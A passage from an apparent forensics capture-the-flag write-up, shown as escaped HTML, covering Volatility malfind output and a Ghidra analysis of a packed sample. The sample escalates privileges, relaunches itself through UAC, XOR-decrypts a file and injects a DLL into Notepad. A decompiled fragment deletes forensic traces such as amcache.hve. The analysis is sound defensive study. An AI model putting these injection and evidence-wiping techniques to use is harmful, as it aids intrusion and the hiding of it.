...p...l...h...d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0010  b0 04 eb 60 b0 05 eb 5c b0 06 eb 58 b0 07 eb 54   ...`...\\\\...X...T\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0020  b0 08 eb 50 b0 09 eb 4c b0 0a eb 48 b0 0b eb 44   ...P...L...H...D\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0030  b0 0c eb 40 b0 0d eb 3c b0 0e eb 38 b0 0f eb 34   ...@...&#x3C;...8...4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0000 b000             MOV AL, 0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0002 eb70             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0004 b001             MOV AL, 0x1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0006 eb6c             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0008 b002             MOV AL, 0x2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de000a eb68             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de000c b003             MOV AL, 0x3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de000e eb64             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0010 b004             MOV AL, 0x4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0012 eb60             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0014 b005             MOV AL, 0x5\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0016 eb5c             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0018 b006             MOV AL, 0x6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de001a eb58             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de001c b007             MOV AL, 0x7\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de001e eb54             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0020 b008             MOV AL, 0x8\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0022 eb50             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0024 b009             MOV AL, 0x9\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0026 eb4c             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0028 b00a             MOV AL, 0xa\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de002a eb48             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de002c b00b             MOV AL, 0xb\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de002e eb44             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0030 b00c             MOV AL, 0xc\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0032 eb40             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0034 b00d             MOV AL, 0xd\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0036 eb3c             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0038 b00e             MOV AL, 0xe\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de003a eb38             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de003c b00f             MOV AL, 0xf\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de003e eb34             JMP 0xde0074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: iexplore.exe Pid: 2752 Address: 0x5fff0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0000  64 74 72 52 00 00 00 00 00 05 ff 5f 00 00 00 00   dtrR......._....\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0000 647472           JZ 0x5fff0075\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0003 52               PUSH EDX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0004 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0006 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0008 0005ff5f0000     ADD [0x5fff], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff000e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0010 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0012 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0014 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0016 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0018 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0020 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0022 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0024 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0026 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0028 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0030 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0032 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0034 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0036 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0038 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: iexplore.exe Pid: 2892 Address: 0x510000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 2, MemCommit: 1, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510000  b0 00 eb 70 b0 01 eb 6c b0 02 eb 68 b0 03 eb 64   ...p...l...h...d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510010  b0 04 eb 60 b0 05 eb 5c b0 06 eb 58 b0 07 eb 54   ...`...\\\\...X...T\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510020  b0 08 eb 50 b0 09 eb 4c b0 0a eb 48 b0 0b eb 44   ...P...L...H...D\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510030  b0 0c eb 40 b0 0d eb 3c b0 0e eb 38 b0 0f eb 34   ...@...&#x3C;...8...4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510000 b000             MOV AL, 0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510002 eb70             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510004 b001             MOV AL, 0x1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510006 eb6c             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510008 b002             MOV AL, 0x2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051000a eb68             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051000c b003             MOV AL, 0x3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051000e eb64             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510010 b004             MOV AL, 0x4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510012 eb60             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510014 b005             MOV AL, 0x5\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510016 eb5c             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510018 b006             MOV AL, 0x6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051001a eb58             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051001c b007             MOV AL, 0x7\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051001e eb54             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510020 b008             MOV AL, 0x8\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510022 eb50             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510024 b009             MOV AL, 0x9\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510026 eb4c             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510028 b00a             MOV AL, 0xa\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051002a eb48             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051002c b00b             MOV AL, 0xb\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051002e eb44             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510030 b00c             MOV AL, 0xc\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510032 eb40             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510034 b00d             MOV AL, 0xd\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510036 eb3c             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00510038 b00e             MOV AL, 0xe\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051003a eb38             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051003c b00f             MOV AL, 0xf\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0051003e eb34             JMP 0x510074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: iexplore.exe Pid: 2892 Address: 0x5fff0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0000  64 74 72 52 00 00 00 00 00 05 ff 5f 00 00 00 00   dtrR......._....\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0000 647472           JZ 0x5fff0075\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0003 52               PUSH EDX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0004 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0006 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0008 0005ff5f0000     ADD [0x5fff], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff000e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0010 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0012 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0014 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0016 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0018 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0020 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0022 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0024 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0026 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0028 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0030 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0032 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0034 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0036 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0038 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PS D:\\DFIR-LABS\\bi0sctfchall1>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Onto some explanation here - What malfind does is to look for memory pages marked for execution AND that don’t have an associated file mapped to disk (signs of code injection). You still need to look at each result to find the malicios code (look for the portable executable signature or shell code)\u003C/p>\n\u003Cp>Some notes which are helpful are  -\u003C/p>\n\u003Cp>PAGE_EXECUTE_READWRITE is suspicious because normal code pages are usually PAGE_EXECUTE_READ, meaning they can run but not be modified. When a page is both executable and writable it often indicates injected or self-modifying shellcode.\u003C/p>\n\u003Cp>VadS with PrivateMemory means the memory region is not mapped from a file. Legitimate code (DLLs, EXEs) is usually file-backed. Private, executable memory is a common sign of code injection via VirtualAlloc or similar APIs.\u003C/p>\n\u003Cp>In the explorer.exe example, the instructions \u003Ccode>MOV EDX, 0x80; MOV EAX, 0xfdeea138; JMP [EAX]\u003C/code> look like a hook redirecting execution, and the changing values (0x80, 0x81, 0x82) resemble a syscall or function pointer table hook. In the iexplore.exe processes, repeated patterns like \u003Ccode>MOV AL, 0x0 / JMP 0xf60074\u003C/code> and \u003Ccode>MOV AL, 0x1 / JMP 0xf60074\u003C/code> across multiple instances point to process injection. Identical injected code in multiple processes strongly suggests malicious activity.\u003C/p>\n\u003Cp>Onto the malware binary , lemme try to dump it and try to reverse it using ghidra .\u003C/p>\n\u003Cp>Before that lemme check what dll’s were being used -\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-1.png\" alt=\"image\">\u003C/p>\n\u003Cp>ADVAPI32.dll provides access to the Windows registry, security functions, and service management - this allows the malware to establish persistence by creating registry keys or installing itself as a service. The sechost.dll library enables security-related operations and privilege manipulation. RPCRT4.dll provides Remote Procedure Call functionality, allowing the malware to communicate with other processes on the system.\u003C/p>\n\u003Cp>USER32.dll manages windows and user input, while GDI32.dll handles graphics rendering. SHELL32.dll is particularly significant as it provides shell and file operation functions, including the ability to execute other programs. This explains how scvhost.exe was able to spawn the notepad.exe process. SHLWAPI.dll provides additional shell utility functions for path and file operations.\u003C/p>\n\u003Cp>Running strings on the binary revealed a lot , Privilege escalation capabilities are evident through the AdjustTokenPrivileges, OpenProcessToken, and LookupPrivilegeValueA imports. These functions allow the malware to manipulate security tokens and potentially elevate its privileges . The malware imports RegOpenKeyExA, RegDeleteKeyA, RegDeleteKeyW, RegDeleteTreeA, RegDeleteTreeW, RegDeleteValueA, and RegDeleteValueW. While these functions can delete registry entries, they are typically paired with registry writing functions to establish autorun keys that would cause the malware to execute on system startup.\u003C/p>\n\u003Cp>Enough bs lets run it on ghidra .\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-2.png\" alt=\"image\">\u003C/p>\n\u003Cp>The dissasembly seems to be a mess , then on the program trees , it showed that the exe has been packed with UPX , so lets unpack and load it again\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-3.png\" alt=\"image\">\u003C/p>\n\u003Cp>I wasted a lot of time trying to dump this , but got a error with UPX .\u003C/p>\n\u003Cp>Malware sometimes alters its UPX headers in memory to block unpacking, so using \u003Ccode>procdump\u003C/code> can produce a tampered binary that UPX refuses to decompress. In this case, \u003Ccode>dumpfiles\u003C/code> from Volatility pulled the untouched executable from the Windows file cache instead of process memory, allowing UPX to successfully unpack it. When UPX fails with a “possibly modified/hacked” error on a memory dump, always try retrieving the file from cache.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-4.png\" alt=\"image\">\u003C/p>\n\u003Cp>Now that the procdump version is working let’s move onto reversing this .\u003C/p>\n\u003Cp>I am using ghidra because idk ida\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-5.png\" alt=\"image\">\u003C/p>\n\u003Cp>We see some sus strings\u003C/p>\n\u003Cp>Also i spotted a starnge env called AZRAEL\r\n\u003Cimg src=\"/images/posts/like-father-like-son/batman-6.png\" alt=\"image\">\u003C/p>\n\u003Cp>Let’s try to understand what this malware is doing  .\u003C/p>\n\u003Cp>This is a lot , ill try to explain the important parts\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-7.png\" alt=\"image\">\u003C/p>\n\u003Cp>Checks if running with admin privileges, If not elevated, uses ShellExecuteExA() with “runas” to relaunch “scvhost.exe” with admin rights , Exits if user cancels UAC prompt (error 0x4c7)\u003C/p>\n\u003Cp>I spotted the malware using  a function  for privilage escalation  .\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-8.png\" alt=\"image\">\u003C/p>\n\u003Cp>This function enables SeDebugPrivilege for the current process by opening the process token, looking up the SeDebugPrivilege LUID, and calling AdjustTokenPrivileges to turn it on. Enabling that privilege lets the program open and manipulate other processes, including system-owned ones, which malware commonly uses to inject code, read memory (for credential theft), or tamper with protected processes. The sequence is a classic first step in process injection and privilege escalation.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-9.png\" alt=\"image\">\u003C/p>\n\u003Cp>In short this does - K32EnumProcesses() → K32EnumProcessModules() → K32GetModuleFileNameExA()\r\nMultiByteToWideChar() → FUN_140031c70(L”Notepad.exe”) , im guessing this is to store , its process ID for later injection .\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-10.png\" alt=\"image\">\u003C/p>\n\u003Cp>Retrieves encryption key from environment variable “AZRAEL” , XORs the key with 0x33\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-11.png\" alt=\"image\">\u003C/p>\n\u003Cp>Opens C:\\confidential.bin for reading -> Creates C:\\Windows\\windowsupdate.bin for output\u003C/p>\n\u003Cp>Im not sure right now about whats being done next but an XOR is happening tho and it’s doing twice ?\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-12.png\" alt=\"image\">\u003C/p>\n\u003Cp>Classic DLL injection ah . Opens Notepad process with full access ->Allocates memory in Notepad’s address space->Writes path to malicious DLL: Msrct.dll->Creates remote thread to load the DLL\u003C/p>\n\u003Cp>Then the malware tries to hide itself by deleating everything\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                CloseHandle\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pvVar10);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002ba6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002bc6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000003a0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppCompat\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Programs\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">amcache.hve\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan 